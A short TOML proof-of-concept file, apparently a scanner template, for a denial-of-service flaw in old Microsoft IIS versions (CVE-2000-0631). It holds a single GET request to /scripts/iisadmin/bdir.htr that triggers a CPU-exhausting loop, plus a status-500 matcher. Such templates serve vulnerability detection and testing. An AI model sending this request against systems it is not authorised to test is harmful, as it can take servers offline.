[info]
author = "AVE"
description = "通过访问 IIS /scripts/iisadmin/bdir.htr 管理脚本时不提供预期参数，触发无限循环耗尽 CPU 资源，导致拒绝服务。影响 IIS 3.0/4.0/5.0（从 IIS 3.0 升级而来）。"
id = "POC-AVE-2000-0766"
name = "Microsoft IIS Absent Directory Browser Argument DoS PoC"
severity = "medium"
tags = [
    "cve-2000-0631",
    "iis",
    "dos",
]
vuln_id = [
    "CVE-2000-0631",
    "AVE-2000-0766",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/scripts/iisadmin/bdir.htr"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [500]
type = "status"
